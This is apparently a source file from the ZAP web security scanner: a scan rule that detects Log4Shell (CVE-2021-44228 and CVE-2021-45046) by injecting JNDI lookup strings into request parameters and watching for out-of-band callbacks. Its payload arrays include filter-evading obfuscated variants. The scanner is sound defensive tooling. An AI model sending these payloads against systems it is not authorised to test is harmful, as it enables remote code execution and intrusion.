/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2021 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.control.Control;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.commonlib.CommonAlertTag;
import org.zaproxy.addon.oast.ExtensionOast;
import org.zaproxy.zap.model.Tech;
import org.zaproxy.zap.model.TechSet;

public class Log4ShellScanRule extends AbstractAppParamPlugin {

    private static final Logger LOGGER = LogManager.getLogger(Log4ShellScanRule.class);
    private static final String PREFIX = "ascanalpha.log4shell.";
    private static final String PREFIX_CVE44228 = PREFIX + "cve44228.";
    private static final String PREFIX_CVE45046 = PREFIX + "cve45046.";
    private static final String[] ATTACK_PATTERNS_CVE44228 = {
        "${jndi:ldap://{0}/abc}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{0}/abc}",
        "${${::-j}ndi:rmi://{0}/abc}",
        "${jndi:rmi://{0}/abc}",
        "${${lower:jndi}:${lower:rmi}://{0}/abc}",
        "${${lower:${lower:jndi}}:${lower:rmi}://{0}/abc}",
        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{0}/abc}",
        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{0}/abc}",
        "${jndi:dns://{0}/abc}",
        "${jndi:${lower:l}${lower:d}a${lower:p}://{0}/abc}"
    };
    private static final String[] ATTACK_PATTERNS_CVE45046 = {
        "${jndi:ldap://127.0.0.1#a.{0}:1389/abc}",
        "${jndi:ldap://127.0.0.1#a.{0}/abc}",
        "${jndi:ldap://localhost#a.{0}/abc}"
    };
    protected static final int ATTACK_PATTERN_COUNT =
            ATTACK_PATTERNS_CVE44228.length + ATTACK_PATTERNS_CVE45046.length;

    @Override
    public int getId() {
        return 40043;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(PREFIX + "name");
    }

    @Override
    public boolean targets(TechSet technologies) {
        return technologies.includesAny(Tech.JAVA);
    }

    @Override
    public String getDescription() {
        return "";
    }

    @Override
    public int getCategory() {
        return Category.MISC;
    }

    @Override
    public String getSolution() {
        return "";
    }

    @Override
    public String getReference() {
        return "";
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    @Override
    public Map<String, String> getAlertTags() {
        Map<String, String> alertTags =
                new HashMap<>(
                        CommonAlertTag.toMap(
                                CommonAlertTag.OWASP_2021_A06_VULN_COMP,
                                CommonAlertTag.OWASP_2017_A09_VULN_COMP,
                                CommonAlertTag.WSTG_V42_INPV_11_CODE_INJ));
        alertTags.put(ExtensionOast.OAST_ALERT_TAG_KEY, ExtensionOast.OAST_ALERT_TAG_VALUE);
        return alertTags;
    }

    @Override
    public int getCweId() {
        return 117;
    }

    @Override
    public int getWascId() {
        return 20;
    }

    @Override
    public void init() {
        ExtensionOast extOast =
                Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
        if (extOast == null || extOast.getActiveScanOastService() == null) {
            getParent().pluginSkipped(this, Constant.messages.getString(PREFIX + "skipped"));
        }
    }

    @Override
    public void scan(HttpMessage msg, String param, String value) {
        try {
            scanWithPayloads(param, ATTACK_PATTERNS_CVE44228, PREFIX_CVE44228);
            scanWithPayloads(param, ATTACK_PATTERNS_CVE45046, PREFIX_CVE45046);
        } catch (Exception e) {
            LOGGER.error(e.getMessage(), e);
        }
    }

    private void scanWithPayloads(String param, String[] attackPatterns, String alertPrefix)
            throws Exception {
        ExtensionOast extOast =
                Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
        for (String attackPattern : attackPatterns) {
            try {
                HttpMessage testMsg = getNewMsg();
                Alert alert =
                        newCustomAlert(alertPrefix).setParam(param).setMessage(testMsg).build();
                String payload = extOast.registerAlertAndGetPayload(alert);
                String attack = attackPattern.replace("{0}", payload);
                alert.setAttack(attack);
                setParameter(testMsg, param, attack);
                sendAndReceive(testMsg);
            } catch (IOException e) {
                LOGGER.warn(e.getMessage(), e);
            }
        }
    }

    private AlertBuilder newCustomAlert(String alertPrefix) {
        return newAlert()
                .setName(Constant.messages.getString(alertPrefix + "name"))
                .setDescription(Constant.messages.getString(alertPrefix + "desc"))
                .setSolution(Constant.messages.getString(alertPrefix + "soln"))
                .setReference(Constant.messages.getString(alertPrefix + "refs"))
                .setConfidence(Alert.CONFIDENCE_MEDIUM);
    }

    @Override
    public List<Alert> getExampleAlerts() {
        return Arrays.asList(
                newCustomAlert(PREFIX_CVE44228).build(), newCustomAlert(PREFIX_CVE45046).build());
    }
}
